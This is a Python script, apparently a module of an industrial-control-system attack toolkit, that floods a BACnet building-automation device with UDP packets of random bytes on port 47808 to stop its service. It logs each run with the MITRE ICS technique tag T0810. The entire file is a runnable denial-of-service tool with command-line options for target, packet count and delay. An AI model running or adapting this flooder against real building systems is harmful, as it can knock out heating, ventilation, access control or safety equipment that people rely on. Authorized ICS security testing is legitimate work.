# modules/exploits/bacnet_device_overloader.py

import argparse
import socket
import time
import random
from datetime import datetime
import json
import os

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0810"  # Service Stop (ICS)

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_bacnet_packet(ip, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(payload, (ip, port))
        return True
    except:
        return False

def flood_bacnet(ip, port, count, delay):
    payload = b'\x81\x0a' + bytes(random.getrandbits(8) for _ in range(1400))  # Fake BACnet NPDU overload
    print(f"[âœ“] Flooding {ip}:{port} with {count} packets")

    for i in range(count):
        if send_bacnet_packet(ip, port, payload):
            print(f"  [>] Sent packet {i+1}/{count}")
        time.sleep(delay)

    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "target_port": port,
        "packet_count": count,
        "delay": delay,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BACnet Device Overloader")
    parser.add_argument("--ip", required=True, help="Target BACnet device IP")
    parser.add_argument("--port", default=47808, type=int, help="BACnet UDP port (default 47808)")
    parser.add_argument("--count", default=50, type=int, help="Number of packets to send")
    parser.add_argument("--delay", default=0.5, type=float, help="Delay between packets (seconds)")
    args = parser.parse_args()

    flood_bacnet(args.ip, args.port, args.count, args.delay)
